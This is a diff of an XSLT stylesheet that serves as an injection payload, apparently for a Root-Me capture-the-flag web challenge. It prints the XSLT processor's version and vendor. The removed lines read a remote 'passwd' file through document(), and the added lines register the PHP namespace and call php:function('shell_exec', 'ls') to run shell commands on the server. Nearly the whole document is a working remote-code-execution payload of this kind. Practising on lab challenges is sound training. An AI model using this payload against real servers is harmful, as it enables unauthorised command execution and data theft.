@@ -1,12 +1,18 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:stylesheet version="1.0" 
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:php="http://php.net/xsl" >
+ 
 <xsl:template match="/">
  <html>
  <body>
  Version: <xsl:value-of select="system-property('xsl:version')" /><br />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
- File : <xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/passwd')" /> <br />
+  
+  EXEC : <xsl:value-of select="php:function('shell_exec', 'ls')" />
+  
+  
  <xsl:if test="system-property('xsl:product-name')">
  Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
  </xsl:if>
